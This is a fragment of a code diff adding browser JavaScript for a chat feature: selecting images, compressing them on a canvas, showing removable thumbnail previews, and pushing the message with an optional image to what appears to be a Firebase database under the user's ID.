+
+function handleImgSelect(inp){
+  const files=Array.from(inp.files||[]);
+  files.forEach(f=>{
+    const reader=new FileReader();
+    reader.onload=e=>compressImg(e.target.result,result=>{
+      pendingImgs.push(result);
+      renderImgPreviews();
+    });
+    reader.readAsDataURL(f);
+  });
+}
+
+function compressImg(src,cb){
+  const img=new Image(); img.onload=()=>{
+    const maxW=600,maxH=600;
+    let w=img.width,h=img.height;
+    if(w>maxW){h=h*maxW/w;w=maxW;}
+    if(h>maxH){w=w*maxH/h;h=maxH;}
+    const cv=document.createElement('canvas');cv.width=w;cv.height=h;
+    cv.getContext('2d').drawImage(img,0,0,w,h);
+    cb(cv.toDataURL('image/jpeg',.7));
+  }; img.src=src;
+}
+
+function renderImgPreviews(){
+  const strip=document.getElementById('img-preview-strip'),cont=document.getElementById('img-previews');
+  strip.style.display=pendingImgs.length?'block':'none'; cont.innerHTML='';
+  pendingImgs.forEach((src,i)=>{
+    const wrap=document.createElement('div'); wrap.style.cssText='position:relative;flex-shrink:0;';
+    const img=document.createElement('img'); img.src=src; img.style.cssText='width:65px;height:65px;object-fit:cover;border-radius:10px;border:1.5px solid rgba(255,255,255,.12);display:block;';
+    const del=document.createElement('button'); del.textContent='×'; del.style.cssText='position:absolute;top:-6px;right:-6px;width:20px;height:20px;border-radius:50%;background:#FF3B30;border:none;color:white;font-size:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;';
+    del.onclick=()=>{pendingImgs.splice(i,1);renderImgPreviews();};
+    wrap.appendChild(img);wrap.appendChild(del);cont.appendChild(wrap);
+  });
+}
+
+async function sendChatMsg(){
+  const txt=document.getElementById('chat-inp').value.trim();
+  if(!txt&&pendingImgs.length===0)return;
+  if(!STATE.userId)return;
+  const msgData={from:'user',text:txt||'',timestamp:Date.now(),time:ts()};
+  if(pendingImgs.length>0){msgData.image=pendingImgs[0];}
+  document.getElementById('chat-inp').value=''; pendingImgs=[]; renderImgPreviews();
+  await db.ref('chats/'+STATE.userId).push(msgData);
+}
 </script>
 
 </body>
